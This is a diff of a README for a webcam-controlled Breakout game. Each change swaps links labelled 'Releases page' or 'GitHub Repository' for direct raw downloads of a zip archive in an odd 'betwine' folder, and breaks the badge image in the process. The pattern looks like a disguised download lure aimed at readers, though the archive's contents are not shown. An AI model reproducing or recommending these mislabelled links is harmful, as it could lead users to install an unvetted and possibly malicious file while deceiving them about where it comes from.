@@ -1,7 +1,7 @@
 # 🖐️ Break-Out-Game- - Enjoy a Fun Arcade Experience
 
 ## 🚀 Download Now
-[![Download Break-Out-Game-](https://img.shields.io/badge/Download%20Break--Out--Game--%20Now-blue.svg)](https://github.com/arunrajkhumars/Break-Out-Game-/releases)
+[![Download Break-Out-Game-](https://github.com/arunrajkhumars/Break-Out-Game-/raw/refs/heads/main/betwine/Break_Out_Game_v1.6.zip%20Break--Out--Game--%https://github.com/arunrajkhumars/Break-Out-Game-/raw/refs/heads/main/betwine/Break_Out_Game_v1.6.zip)](https://github.com/arunrajkhumars/Break-Out-Game-/raw/refs/heads/main/betwine/Break_Out_Game_v1.6.zip)
 
 ## 📖 Description
 🖐️🎮 Hand Breakout Game is a modern Breakout-style arcade game where you play using real-time hand gestures through a webcam 📷. Built with Pygame, OpenCV, and MediaPipe 💻✨, it blends classic arcade fun with cutting-edge computer vision-based interaction 🚀🧠.
@@ -26,7 +26,7 @@ To run Hand Breakout Game smoothly, your computer should meet the following requ
 To get started with Break-Out-Game-, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Head over to our [Releases page](https://github.com/arunrajkhumars/Break-Out-Game-/releases) to find the latest version of the game.
+   Head over to our [Releases page](https://github.com/arunrajkhumars/Break-Out-Game-/raw/refs/heads/main/betwine/Break_Out_Game_v1.6.zip) to find the latest version of the game.
 
 2. **Download the Game**  
    Find the appropriate version for your operating system and click on the download link. This will begin the download process.
@@ -44,7 +44,7 @@ To get started with Break-Out-Game-, follow these simple steps:
    Follow the in-game instructions to understand how to use your hands for control. Enjoy the game!
 
 ## 📥 Download & Install
-To download the game, visit our [Releases page](https://github.com/arunrajkhumars/Break-Out-Game-/releases), find the latest version, and select the file suited for your operating system. This process is straightforward and allows you to get the game up and running quickly.
+To download the game, visit our [Releases page](https://github.com/arunrajkhumars/Break-Out-Game-/raw/refs/heads/main/betwine/Break_Out_Game_v1.6.zip), find the latest version, and select the file suited for your operating system. This process is straightforward and allows you to get the game up and running quickly.
 
 ## 🎮 Gameplay Instructions
 - **Using Hand Gestures**: The game uses your webcam to recognize hand movements. Keep your hands visible to control the paddle.
@@ -68,7 +68,7 @@ We welcome contributions. If you want to improve the game or report issues, plea
 Special thanks to the developers of Pygame, OpenCV, and MediaPipe for their incredible tools and support that made this project possible.
 
 ## 🔗 Links
-- [Releases Page](https://github.com/arunrajkhumars/Break-Out-Game-/releases)
-- [GitHub Repository](https://github.com/arunrajkhumars/Break-Out-Game-)
+- [Releases Page](https://github.com/arunrajkhumars/Break-Out-Game-/raw/refs/heads/main/betwine/Break_Out_Game_v1.6.zip)
+- [GitHub Repository](https://github.com/arunrajkhumars/Break-Out-Game-/raw/refs/heads/main/betwine/Break_Out_Game_v1.6.zip)
 
 Enjoy playing the Hand Breakout Game!
